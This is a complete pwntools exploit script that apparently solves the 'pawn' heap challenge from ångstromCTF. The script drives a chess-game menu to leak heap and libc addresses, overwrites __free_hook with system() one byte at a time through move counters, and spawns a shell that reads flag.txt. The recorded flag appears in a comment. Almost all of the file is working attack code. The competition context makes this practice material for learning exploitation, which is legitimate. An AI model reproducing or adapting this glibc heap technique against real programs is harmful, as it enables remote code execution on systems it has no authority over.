from pwn import *
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'split-window', '-h']


TARGET = './pawn'
HOST = 'shell.actf.co'
PORT = 21706

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		# return process(TARGET)
		return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'rb').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)
	# return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [])

def new(idx):
	r.sendlineafter('Board\n', '1')
	r.sendlineafter('?\n', str(idx))

def p(idx):
	r.sendlineafter('Board\n', '2')
	r.sendlineafter('?\n', str(idx))

def mov(idx, px, py, x, y):
	r.sendlineafter('Board\n', '3')
	r.sendlineafter('?\n', str(idx))
	# r.sendlineafter('.\n', '{} {}'.format(px, py))
	# r.sendlineafter('.\n', '{} {}'.format(x, y))
	# r.sendlineafter('Board\n', '3')
	# r.sendline(str(idx))
	r.sendline('{} {}'.format(px, py))
	r.sendline('{} {}'.format(x, y))

def smite(idx, x, y):
	r.sendlineafter('Board\n', '4')
	r.sendlineafter('?\n', str(idx))
	r.sendlineafter('.\n', '{} {}'.format(x, y))

def d(idx):
	r.sendlineafter('Board\n', '5')
	r.sendlineafter('?\n', str(idx))

new(0)
new(1)
new(2)
d(0)
d(1)
p(1)

# heap leak
r.recvuntil('0 ')
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
heap = leak - 0x12b0
dbg('heap')

for i in range(4):
	for j in range(6):
		mov(1, i, 6-j, i, 6-j-1)

# smite: 0x18
# target: 0x4040a0

# increase t (to 0x3f)
mov(0, 1, 6, 1, 5)
mov(0, 2, 7, 1, 6)
for i in range((0x3e-0x18-2)/2):
	mov(0, 3, 7,2, 7)
	mov(0, 2, 7,3, 7)
mov(0, 3, 7,2, 7)
mov(0, 2, 7,3, 7)

smite(1, 1, 0)
smite(1, 2, 0)

# smite: 0x40
# stall again (to 0xd0)
for i in range((0xd0-0x40)/2):
	mov(0, 3, 7,2, 7)
	mov(0, 2, 7,3, 7)
smite(1, 0, 0)

# smite: 0xc0
# stall again (to 0x100)
for i in range((0x100-0xd0)/2):
	mov(0, 3, 7,2, 7)
	mov(0, 2, 7,3, 7)
smite(1, 3, 0)
p(1)

new(1)
new(0)

# rize p line
for i in range(6):
	for j in range(4):
		mov(0, i, 6-j, i, 6-j-1)

# fill null 
mov(0, 0, 7,0, 5)
mov(0, 0, 5,8, 5)
mov(0, 8, 5,8, 0)

mov(0, 7, 7,8, 7)
mov(0, 8, 7,8, 1)

p(0)

# Pline: 0x404029
# row5:  0x4040f8
# pline: 0x404056

# t: 0x11d

for i in range((0x129-0x11d)/2):
	mov(0, 3, 7,3, 6)
	mov(0, 3, 6,3, 7)
smite(0, 0, 0)
for i in range((0x13f-0x129)/2):
	mov(0, 3, 7,3, 6)
	mov(0, 3, 6,3, 7)

mov(0, 3, 7,3, 6)
smite(0, 1, 0)
smite(0, 2, 0)
smite(0, 1, 1)
smite(0, 8, 1)
smite(0, 0, 2)
smite(0, 0, 1)

mov(0, 3, 6,3, 7)
mov(0, 3, 7,3, 6)

for i in range((0x156-0x142)/2):
	mov(0, 3, 6,3, 7)
	mov(0, 3, 7,3, 6)
smite(0, 7, 1)

for i in range((0x1f8-0x156)/2):
	mov(0, 3, 6,3, 7)
	mov(0, 3, 7,3, 6)

smite(0, 8, 0)

for i in range((0x200-0x1f8)/2):
	mov(0, 3, 6,3, 7)
	mov(0, 3, 7,3, 6)

smite(0, 3, 0)
smite(0, 4, 0)
smite(0, 5, 0)
smite(0, 6, 0)
smite(0, 7, 0)

smite(0, 2, 1)
smite(0, 3, 1)
smite(0, 4, 1)
smite(0, 5, 1)
smite(0, 6, 1)

smite(0, 1, 2)
smite(0, 2, 2)
smite(0, 3, 2)
smite(0, 4, 2)
smite(0, 5, 2)

# edit slot0_row5
mov(2, 0, 0, 0, 1)
mov(2, 1, 0, 1, 1)
mov(2, 2, 0, 2, 1)
mov(2, 3, 0, 3, 1)

mov(1, 1, 6, 1, 5)
mov(1, 2, 7, 1, 6)
for i in range((0x23e-0x206)/2):
	mov(1, 3, 7,2, 7)
	mov(1, 2, 7,3, 7)

mov(1, 3, 7,2, 7)
smite(2, 1, 1)

mov(1, 2, 7,3, 7)
smite(2, 2, 1)

for i in range((0x298-0x240)/2):
	mov(1, 3, 7,2, 7)
	mov(1, 2, 7,3, 7)

smite(2, 0, 1)
for i in range((0x300-0x298)/2):
	mov(1, 3, 7,2, 7)
	mov(1, 2, 7,3, 7)
smite(2, 3, 1)
p(0)
r.recvuntil('5 ')
leak = u64(r.recvuntil('\n', True).ljust(8, '\x00'))
dbg('leak')
base = leak -0x9d850
dbg('base')
fh = base + 0x1eeb28
system = base + 0x55410

# edit slot0_row5 again
for i in range(6):
	mov(2, i, 2, i, 1)

# t: 0x306
offset = 0x306
for i in range(6):
	diff = (((fh-2) >> (i*8)) - offset) % 0x100
	for _ in range(diff//2):
		mov(1, 3, 7,2, 7)
		mov(1, 2, 7,3, 7)
	if diff % 2 != 0:
		mov(1, 3, 7,2, 7)
	smite(2, i, 1)
	if diff % 2 != 0:
		mov(1, 2, 7,3, 7)
		offset += diff+1
	else:
		offset += diff
	
# pawn
mov(0, 6, 6, 6, 5)
mov(0, 7, 6, 7, 5)

# knight
mov(0, 1, 7, 2, 5)
mov(0, 6, 7, 5, 5)

# bishop
mov(0, 2, 7, 3, 6)
mov(0, 3, 6, 4, 5)

mov(0, 5, 7, 4, 6)
mov(0, 4, 6, 3, 5)

offset += 8-1

# fh -> system
for i in range(6):
	diff = (((system) >> (i*8)) - offset) % 0x100
	for _ in range(diff/2):
		mov(1, 3, 7,2, 7)
		mov(1, 2, 7,3, 7)
	if diff % 2 != 0:
		mov(1, 3, 7,2, 7)
	smite(0, i+2, 5)
	if diff % 2 != 0:
		mov(1, 2, 7,3, 7)
		offset += diff+1
	else:
		offset += diff
target = 0x6465
new(0)
for i in range(3):
	diff = (((target) >> (i*8)) - offset) % 0x100
	for _ in range(diff/2):
		mov(1, 3, 7,2, 7)
		mov(1, 2, 7,3, 7)
	if diff % 2 != 0:
		mov(1, 3, 7,2, 7)
	smite(0, i, 0)
	if diff % 2 != 0:
		mov(1, 2, 7,3, 7)
		offset += diff+1
	else:
		offset += diff
d(0)
r.sendline('!sh')
sleep(0.1)
r.sendline('cat flag.txt; pwd; ls -la; cat f*')
# actf{thatll_shut_the_freshmen_up}

r.interactive()
r.close()
